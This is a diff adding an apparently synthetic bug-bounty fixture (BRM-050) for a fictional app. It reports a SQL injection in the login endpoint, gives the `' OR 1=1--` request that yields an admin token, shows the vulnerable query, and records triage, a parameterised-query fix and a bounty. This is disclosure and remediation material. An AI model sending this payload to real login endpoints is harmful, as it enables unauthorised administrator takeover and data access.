@@ -1,0 +1,59 @@
+id: BRM-050
+title: SQL injection in /rest/user/login authenticates as administrator
+vulnerability_information: |
+  ## Summary
+  The login handler builds the auth query by string interpolation of the `email`
+  field. Injecting `' OR 1=1--` returns the first row (the administrator) and the
+  app issues a valid session for it. No password needed.
+
+  ## Steps to reproduce
+  ```
+  POST {{base_url}}/rest/user/login HTTP/1.1
+  Content-Type: application/json
+
+  {"email":"' OR 1=1--","password":"x"}
+  ```
+
+  ## Observed result
+  `200 OK` with:
+  ```
+  {"authentication":{"token":"<JWT>","bid":1,"umail":"admin@bramble.example"}}
+  ```
+  The token belongs to `admin@bramble.example`. Setting it as the `token` cookie
+  gives full admin access.
+
+  ## Root cause
+  ```
+  SELECT * FROM Users WHERE email = '<input>' AND password = '...' AND deletedAt IS NULL
+  ```
+  `req.body.email` is interpolated directly. `' OR 1=1--` comments out the
+  password predicate and `ORDER BY name` returns admin first.
+impact: |
+  Unauthenticated full administrative account takeover. Any attacker can sign in
+  as admin and reach every privileged function and all customer data. Critical.
+  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8).
+timeline:
+  - after: 32m
+    by: team
+    do: comment
+    internal: true
+    message: Reproduced immediately. Textbook auth-bypass SQLi on the login query. Top priority.
+  - after: 18m
+    by: team
+    do: state
+    state: triaged
+    message: Confirmed on prod — the payload returns an admin token. This is critical and we are escalating internally right now. Thanks for the fast, clean report.
+  - after: 10m
+    by: team
+    do: severity
+    rating: critical
+  - after: 5d
+    by: team
+    do: state
+    state: resolved
+    message: Login now uses a parameterised query with bound values; the injection no longer authenticates. Verified against your payload and several variants. Thank you.
+  - after: 6h
+    by: team
+    do: bounty
+    amount: 3000
+    message: Highest-impact report of the quarter and a minimal repro. Thank you.
